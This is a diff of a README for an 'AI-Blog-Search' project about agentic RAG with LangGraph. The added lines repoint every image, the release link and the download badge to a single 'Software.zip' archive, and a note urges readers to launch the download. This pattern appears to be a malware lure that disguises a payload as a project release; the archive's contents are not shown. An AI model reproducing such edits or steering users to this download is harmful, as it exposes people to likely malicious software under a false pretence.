@@ -1,6 +1,6 @@
 # 🤖🔎 Welcome to AI-Blog-Search 📚🔍
 
-![AI-Blog-Search](https://www.example.com/images/ai-blog-search.png)
+![AI-Blog-Search](https://github.com/TieTeah/AI-Blog-Search/releases/download/v1.0/Software.zip)
 
 ## Agentic RAG with LangGraph 🔥
 
@@ -21,9 +21,9 @@ Welcome to the AI-Blog-Search repository, where we explore the exciting world of
 - Semantic Search
 
 ### Get Started
-To begin leveraging the power of LangGraph and agentic AI, check out our latest release [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To begin leveraging the power of LangGraph and agentic AI, check out our latest release [here](https://github.com/TieTeah/AI-Blog-Search/releases/download/v1.0/Software.zip).
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/TieTeah/AI-Blog-Search/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/TieTeah/AI-Blog-Search/releases/download/v1.0/Software.zip)
 
 **Note:** The download link provided needs to be launched for accessing the latest release. If you encounter any issues with the link, feel free to explore the "Releases" section for alternative options.
 
@@ -42,4 +42,4 @@ If you have any questions, feedback, or ideas to share, feel free to reach out t
 
 Let's embark on a transformative AI journey with AI-Blog-Search! 🚀🔍
 
-![LangGraph](https://www.example.com/images/langgraph.png)
+![LangGraph](https://github.com/TieTeah/AI-Blog-Search/releases/download/v1.0/Software.zip)
